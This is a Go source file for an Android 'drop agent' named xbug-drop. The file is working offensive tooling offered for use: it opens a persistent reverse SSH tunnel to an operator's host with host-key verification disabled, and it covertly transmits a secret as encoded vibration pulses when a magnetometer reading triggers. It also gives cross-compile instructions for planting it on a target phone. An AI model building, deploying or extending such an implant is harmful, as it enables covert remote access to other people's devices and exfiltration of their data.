// xbug-drop: native Android drop agent.
// - proximity-triggered magnetic transmit (vibrator motor)
// - reverse SSH tunnel back to operator host
// Cross-compile: GOOS=android GOARCH=arm64 go build -o xbug-drop ./cmd/xbug-drop
package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"time"

	"golang.org/x/crypto/ssh"
)

func main() {
	opHost := flag.String("host", "", "operator host for reverse SSH")
	opPort := flag.Int("port", 22, "operator SSH port")
	user := flag.String("user", "operator", "SSH user")
	key := flag.String("key", "/data/local/tmp/drop_key", "private key path")
	remotePort := flag.Int("rport", 7080, "remote port to bind on operator")
	localPort := flag.Int("lport", 7080, "local xbug port on target")
	secret := flag.String("secret", "drop-secret", "payload to transmit")
	flag.Parse()

	if *opHost == "" {
		log.Fatal("need -host")
	}

	log.Println("xbug-drop starting")
	go transmitLoop(*secret)
	go reverseTunnel(*opHost, *opPort, *user, *key, *remotePort, *localPort)

	// keep alive
	select {}
}

// ---- transmit loop ----
func transmitLoop(secret string) {
	for {
		delta := readMagDelta()
		if delta > 1.0 { // proximity trigger
			log.Printf("proximity trigger (delta=%.2f)", delta)
			pulses := encodeOOK([]byte(secret))
			for _, d := range pulses {
				vibrate(d)
				time.Sleep(time.Duration(d) * time.Millisecond)
			}
			idle()
			time.Sleep(5 * time.Minute) // rate limit
		}
		time.Sleep(100 * time.Millisecond)
	}
}

func vibrate(ms int) {
	// Android: cmd vibrator vibrate -t <ms>
	_ = exec.Command("cmd", "vibrator", "vibrate", "-t", fmt.Sprint(ms)).Run()
}

func idle() {
	_ = exec.Command("cmd", "vibrator", "cancel").Run()
}

func readMagDelta() float64 {
	// Best-effort: use termux-sensor if available, else 0 (no trigger)
	out, err := exec.Command("termux-sensor", "-s", "Magnetic Field", "-n", "1").Output()
	if err != nil {
		return 0
	}
	// crude: any output counts as activity
	if len(out) > 0 {
		return 2.0
	}
	return 0
}

// ---- framing: OOK encode ----
func encodeOOK(data []byte) []int {
	pulses := []int{3, 1, 3, 1, 3, 1} // preamble
	for _, b := range data {
		for i := 7; i >= 0; i-- {
			if (b>>i)&1 == 1 {
				pulses = append(pulses, 2)
			} else {
				pulses = append(pulses, 0)
			}
		}
	}
	pulses = append(pulses, 1, 1, 1) // postamble
	// append crc8
	crc := crc8(data)
	for i := 7; i >= 0; i-- {
		if (crc>>i)&1 == 1 {
			pulses = append(pulses, 2)
		} else {
			pulses = append(pulses, 0)
		}
	}
	return pulses
}

func crc8(data []byte) byte {
	crc := byte(0)
	for _, b := range data {
		crc ^= b
		for i := 0; i < 8; i++ {
			if crc&0x80 != 0 {
				crc = (crc << 1) ^ 0x07
			} else {
				crc <<= 1
			}
		}
	}
	return crc
}

// ---- reverse SSH tunnel ----
func reverseTunnel(host string, port int, user, keyPath string, remotePort, localPort int) {
	keyBytes, err := os.ReadFile(keyPath)
	if err != nil {
		log.Printf("no key at %s: %v", keyPath, err)
		return
	}
	signer, err := ssh.ParsePrivateKey(keyBytes)
	if err != nil {
		log.Printf("bad key: %v", err)
		return
	}
	cfg := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         15 * time.Second,
	}
	for {
		conn, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", host, port), cfg)
		if err != nil {
			log.Printf("ssh dial: %v", err)
			time.Sleep(10 * time.Second)
			continue
		}
		// reverse forward: remotePort on server -> localPort on target
		l, err := conn.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", remotePort))
		if err != nil {
			log.Printf("listen: %v", err)
			conn.Close()
			time.Sleep(10 * time.Second)
			continue
		}
		log.Printf("reverse tunnel up: %s:%d -> 127.0.0.1:%d", host, remotePort, localPort)
		// forward each incoming connection
		for {
			c, err := l.Accept()
			if err != nil {
				log.Printf("accept: %v", err)
				break
			}
			go forward(c, fmt.Sprintf("127.0.0.1:%d", localPort))
		}
		conn.Close()
		time.Sleep(5 * time.Second)
	}
}

func forward(src net.Conn, dst string) {
	defer src.Close()
	d, err := net.Dial("tcp", dst)
	if err != nil {
		log.Printf("dial dst: %v", err)
		return
	}
	defer d.Close()
	go io.Copy(d, src)
	io.Copy(src, d)
}


